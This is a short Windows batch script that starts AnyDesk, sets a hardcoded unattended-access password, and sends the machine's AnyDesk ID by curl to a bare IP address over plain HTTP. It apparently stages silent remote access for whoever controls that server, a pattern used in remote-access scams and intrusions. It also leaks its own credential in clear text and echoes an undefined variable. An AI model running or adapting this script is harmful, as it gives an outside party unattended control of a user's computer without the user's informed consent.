@echo off
start "" "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
timeout /t 15 /nobreak
echo Getting AnyDesk ID
:: Retrieve AnyDesk ID
for /f "delims=" %%i in ('"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --get-id') do set ID=%%i
echo AnyDesk ID is: %ID%
echo Setting AnyDesk password to be G2WdQ4rZtriUWWT4dBueShUNnB6tDiJJ8Fs91c8KB4PS
echo G2WdQ4rZtriUWWT4dBueShUNnB6tDiJJ8Fs91c8KB4PS | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password
:: Define the server URL and public key
set SERVER_URL=http://3.13.157.111:3000/anydesk-id/%ID%
set PUBKEY=G2WdQ4rZtriUWWT4dBueShUNnB6tDiJJ8Fs91c8KB4PS
echo Sending ID to server: %API_URL%
:: Send GET request with AnyDesk ID as a parameter and custom header
curl -G "%SERVER_URL%" -H "x-pubkey: %PUBKEY%"
echo All successful
pause